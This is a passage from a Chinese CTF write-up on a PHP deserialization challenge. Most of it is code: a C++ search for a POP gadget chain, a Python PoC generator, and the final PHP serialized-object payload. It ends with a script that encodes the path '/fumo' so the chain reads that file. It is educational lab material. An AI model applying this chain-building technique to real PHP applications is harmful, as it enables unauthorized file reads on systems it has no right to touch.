class="built_in">make_pair</span>(_4,_5);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;e[maxn &lt;&lt; <span class="number">4</span>]; </span><br><span class="line"><span class="keyword">int</span> first[maxn], ce = <span class="number">-1</span>, tot, tag[maxn];</span><br><span class="line">string name[maxn], func[maxn], use[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Class</span> &#123;</span></span><br><span class="line">	string name, func;</span><br><span class="line">	<span class="built_in">Class</span> () &#123;&#125;</span><br><span class="line">	<span class="built_in">Class</span> (string _1, string _2):<span class="built_in">name</span>(_1), <span class="built_in">func</span>(_2) &#123;&#125;	</span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Class &amp;s) <span class="keyword">const</span> &#123;</span><br><span class="line">		<span class="keyword">if</span>(name == s.name) &#123;</span><br><span class="line">			<span class="keyword">return</span> func &lt; s.func;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> name &lt; s.name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line"><span class="keyword">int</span> pre[maxn], n;</span><br><span class="line">PII prew[maxn]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addEdge</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b, string c,string d)</span> </span>&#123;</span><br><span class="line">	e[++ce] = <span class="built_in">Edge</span>(a, b, first[a], c, d); first[a] = ce;</span><br><span class="line">&#125;	</span><br><span class="line">map&lt;Class, <span class="keyword">int</span>&gt; M;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">match</span><span class="params">(Class A,string use_func, string use_obj, string pass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (M[A] == i) <span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span> (use_func == a[i].func) &#123;</span><br><span class="line">			<span class="built_in">addEdge</span>(M[A], M[a[i]], use_obj, pass);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> vis[maxn];</span><br><span class="line"><span class="keyword">int</span> count_chain;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now, <span class="keyword">int</span> fa)</span> </span>&#123;</span><br><span class="line">	vis[now] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (tag[now]) &#123;</span><br><span class="line">		count_chain ++;</span><br><span class="line">		<span class="keyword">int</span> tmp = now;</span><br><span class="line">		cout &lt;&lt; a[tmp].name &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; a[tmp].func &lt;&lt; endl; </span><br><span class="line">		string use_obj = prew[tmp].X, pass_way = prew[tmp].Y;</span><br><span class="line">		tmp = pre[tmp];</span><br><span class="line">		<span class="keyword">while</span>(tmp != <span class="number">-1</span>) &#123;</span><br><span class="line">			cout &lt;&lt; a[tmp].name &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; a[tmp].func &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; use_obj &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; pass_way &lt;&lt; endl;</span><br><span class="line">			use_obj = prew[tmp].X, pass_way = prew[tmp].Y;</span><br><span class="line">			tmp = pre[tmp];</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = first[now]; i != <span class="number">-1</span>; i = e[i].next) &#123;</span><br><span class="line">		<span class="keyword">if</span>(e[i].v != fa &amp;&amp; !vis[e[i].v]) &#123;</span><br><span class="line">			<span class="keyword">if</span>(e[i].w.Y == <span class="string">&quot;base64_encode&quot;</span>)<span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">if</span>(e[i].w.Y == <span class="string">&quot;ucfirst&quot;</span>)<span class="keyword">continue</span>;</span><br><span class="line">			pre[e[i].v] = now;</span><br><span class="line">			prew[e[i].v] = e[i].w;</span><br><span class="line">			<span class="built_in">dfs</span>(e[i].v, now);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">mem</span>(first, <span class="number">-1</span>);</span><br><span class="line">	<span class="built_in">freopen</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>, stdin);</span><br><span class="line">	<span class="built_in">freopen</span>(<span class="string">&quot;ans.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, stdout);</span><br><span class="line">	<span class="keyword">int</span> start = <span class="number">1</span>;</span><br><span class="line">	n = <span class="built_in">read</span>();</span><br><span class="line">	string params;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		cin &gt;&gt; name[i] &gt;&gt; func[i];</span><br><span class="line">		a[i] = <span class="built_in">Class</span>(name[i], func[i]);</span><br><span class="line">		M[a[i]] = i;</span><br><span class="line">	&#125; 	 </span><br><span class="line">	<span class="keyword">int</span> m = <span class="built_in">read</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">		string class_name, func_name, use_obj, use_func, pass_way;</span><br><span class="line">		cin &gt;&gt; class_name &gt;&gt; func_name &gt;&gt; use_obj &gt;&gt; use_func &gt;&gt; pass_way;<span class="comment">//$class_name.&#x27; &#x27;.$func_name.&#x27; &#x27;.$use_obj.&quot; &quot;.$use_func.&quot; &quot;.$pass_way</span></span><br><span class="line">		<span class="keyword">int</span> id = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">			<span class="keyword">if</span> (class_name == name[j] &amp;&amp; func_name == func[j]) &#123;</span><br><span class="line">				id = j;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="built_in">match</span>(a[id], use_func, use_obj, pass_way);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> o = <span class="built_in">read</span>();</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= o; i++) &#123;</span><br><span class="line">		string x, y, z;</span><br><span class="line">		cin &gt;&gt; x &gt;&gt; y &gt;&gt; z;</span><br><span class="line">		<span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">			<span class="keyword">if</span>(x == name[j] &amp;&amp; y == func[j]) &#123;</span><br><span class="line">				id=j;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">if</span>(id==<span class="number">0</span>)cout&lt;&lt;x&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">		tag[id] = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pre[start] = <span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">dfs</span>(start, <span class="number">-1</span>);</span><br><span class="line">	cout&lt;&lt;count_chain;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>刚好只有一条可行链，倒序打印链：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AN9pNsmlT Fhh5TZoD0</span><br><span class="line">Ugh4SYk00D bLqi60vf tQF7ER str_rot13</span><br><span class="line">xEFW8yw08 gvgCPyi nYuAuh2 str_rot13</span><br><span class="line">Xl5V1fEbzD Z5G5uz fgVgm4TV97 pass</span><br><span class="line">d9vgRnlEA trZx9DLGq T4rUU9R base64_decode</span><br><span class="line">Ronyv7u Uaxr3XOrz uDQ0ehd4p strrev</span><br><span class="line">T6Y5QYS GP5h5gz p9mwE7l str_rot13</span><br><span class="line">SKVnfvfbas gkbXYD UOvWbl pass</span><br><span class="line">o5d0ioNZ vBmg2S exGoDOPm str_rot13</span><br><span class="line">FK0LfIlrxm uxVcfoc gZ9IzdbF6T pass</span><br><span class="line">eHSt3I5L30 YbMfp8D9 exoEH1 pass</span><br><span class="line">c76So3oF EttYcl6 cwQWOIEL strrev</span><br><span class="line">u1q3m04qZb EtQ6pQB NGIlAGGLv pass</span><br><span class="line">xT506K QiVLzL Dblxvn pass</span><br><span class="line">p6NArTi YgmXN30 VbpsE7wqUH base64_decode</span><br><span class="line">ezlgUUHCdQ lwUpo3 fDViVU pass</span><br><span class="line">uGnuU5pGgQ cc60Kte4Em XbW5o6yiGv base64_decode</span><br><span class="line">GGcIkQ6E a2l0Eeqr CK5OgoyC strrev</span><br><span class="line">vS1qenzGWr kR5Y66g yrVWMn9 pass</span><br><span class="line">amg2Vw __destruct PCR49GlRM pass</span><br></pre></td></tr></table></figure><br>根据上述链的写脚本构造poc：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;popchain.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&#x27;poc.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">fo.write(<span class="string">&#x27;&lt;?php\nnamespace christmasTree&#123;\n&#x27;</span>)</span><br><span class="line">line_list = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fp.readlines():</span><br><span class="line">    line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    line_list.append(line)</span><br><span class="line">line_list = line_list[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(line_list[:-<span class="number">1</span>]):</span><br><span class="line">    class_name, func_name, use_obj, _ = line.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        start_point = class_name</span><br><span class="line">    next_name = line_list[i + <span class="number">1</span>].split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(class_name, func_name, use_obj, next_name)</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;class %s&#123;</span></span><br><span class="line"><span class="string">        public $%s;</span></span><br><span class="line"><span class="string">        public function __construct()&#123;</span></span><br><span class="line"><span class="string">            $this-&gt;%s = new %s();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (class_name, use_obj, use_obj, next_name)</span><br><span class="line">    fo.write(payload + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">class_name, func_name = line_list[-<span class="number">1</span>].split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;class %s&#123;</span></span><br><span class="line"><span class="string">        public $%s;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (class_name, use_obj)</span><br><span class="line">fo.write(payload + <span class="string">&#x27;\necho urlencode(serialize(new %s()));&#125;&#x27;</span> % start_point)</span><br><span class="line"><span class="built_in">print</span>(class_name, func_name)</span><br></pre></td></tr></table></figure><br>生成的poc不能直接打通，因为要求类内所有public属性都要进行赋值，对生成的poc还需要手动修改，对未利用的对象赋为<code>stdClass()</code>.<br>最终的poc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">christmasTree</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">amg2Vw</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">PCR49GlRM</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;PCR49GlRM = <span class="keyword">new</span> vS1qenzGWr();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vS1qenzGWr</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$yrVWMn9</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$S839pvNRU</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;yrVWMn9 = <span class="keyword">new</span> GGcIkQ6E();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;S839pvNRU = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GGcIkQ6E</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CK5OgoyC</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Vkyud3</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;CK5OgoyC = <span class="keyword">new</span> uGnuU5pGgQ();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Vkyud3 = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">uGnuU5pGgQ</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$XbW5o6yiGv</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$XEH9BQ</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;XbW5o6yiGv = <span class="keyword">new</span> ezlgUUHCdQ();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;XEH9BQ = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ezlgUUHCdQ</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fDViVU</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;fDViVU = <span class="keyword">new</span> p6NArTi();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">p6NArTi</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$VbpsE7wqUH</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$yKwNrpRAQ</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;VbpsE7wqUH = <span class="keyword">new</span> xT506K();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;yKwNrpRAQ = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xT506K</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Dblxvn</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sPEbogX4</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Dblxvn = <span class="keyword">new</span> u1q3m04qZb();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sPEbogX4 = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">u1q3m04qZb</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$NGIlAGGLv</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;NGIlAGGLv = <span class="keyword">new</span> c76So3oF();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c76So3oF</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cwQWOIEL</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$rHYG3Wr</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cwQWOIEL = <span class="keyword">new</span> eHSt3I5L30();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rHYG3Wr = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eHSt3I5L30</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$exoEH1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$UO4yLd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exoEH1 = <span class="keyword">new</span> FK0LfIlrxm();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;UO4yLd = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FK0LfIlrxm</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$gZ9IzdbF6T</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Q7mg44bg</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;gZ9IzdbF6T = <span class="keyword">new</span> o5d0ioNZ();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Q7mg44bg = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">o5d0ioNZ</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$exGoDOPm</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$TEODq2c3Uo</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exGoDOPm = <span class="keyword">new</span> SKVnfvfbas();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;TEODq2c3Uo = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SKVnfvfbas</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$UOvWbl</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$m4pnFndZoX</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;UOvWbl = <span class="keyword">new</span> T6Y5QYS();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;m4pnFndZoX = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T6Y5QYS</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$p9mwE7l</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$aysl2yR5g</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;p9mwE7l = <span class="keyword">new</span> Ronyv7u();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;aysl2yR5g = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ronyv7u</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$uDQ0ehd4p</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$uqkULP0XD</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;uDQ0ehd4p = <span class="keyword">new</span> d9vgRnlEA();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;uqkULP0XD = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d9vgRnlEA</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$T4rUU9R</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;T4rUU9R = <span class="keyword">new</span> Xl5V1fEbzD();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xl5V1fEbzD</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fgVgm4TV97</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;fgVgm4TV97 = <span class="keyword">new</span> xEFW8yw08();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xEFW8yw08</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$nYuAuh2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;nYuAuh2 = <span class="keyword">new</span> Ugh4SYk00D();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ugh4SYk00D</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$tQF7ER</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tQF7ER = <span class="keyword">new</span> AN9pNsmlT();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AN9pNsmlT</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Ipz7D3</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Ipz7D3 = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> amg2Vw()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时对pop链中的所有编码过程进行逆向，得到最终要进行读<code>/fumo</code>的编码结果：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">&quot;popchain.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;/fumo&#x27;</span>;</span><br><span class="line"><span class="variable">$line</span> = fgets(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$list</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">while</span>(! feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">    <span class="variable">$line</span> = fgets(<span class="variable">$fp</span>);<span class="comment">//fgets()函数从文件指针中读取一行</span></span><br><span class="line">    array_push(<span class="variable">$list</span>, trim(<span class="variable">$line</span>));</span><br><span class="line">    <span class="variable">$line</span> = trim(explode(<span class="string">&quot; &quot;</span>,<span class="variable">$line</span>)[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$line</span> === <span class="string">&quot;pass&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$line</span> === <span class="string">&quot;base64_decode&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$payload</span> = base64_encode(<span class="variable">$payload</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$line</span> === <span class="string">&quot;ucfirst&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$line</span> === <span class="string">&quot;strrev&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$payload</span> = strrev(<span class="variable">$payload</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$line</span> === <span class="string">&quot;str_rot13&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$payload</span> = str_rot13(<span class="variable">$payload</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$list</span> = array_reverse(<span class="variable">$list</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$list</span> <span class="keyword">as</span> <span class="variable">$line</span>)&#123;</span><br><span class="line">    <span class="variable">$line</span> = explode(<span class="string">&quot; &quot;</span>,<span class="variable">$line</span>)[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$line</span> === <span class="string">&quot;pass&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$line</span> === <span class="string">&quot;base64_decode&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$payload</span> = base64_decode(<span class="variable">$payload</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$line</span> === <span class="string">&quot;ucfirst&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$line</span> === <span class="string">&quot;strrev&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$payload</span> = strrev(<span class="variable">$payload</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$line</span> === <span class="string">&quot;str_rot13&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$payload</span> = str_rot13(<span class="variable">$payload</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure><br>最终序列化链：<br><figure class="highlight php"><table><tr><td 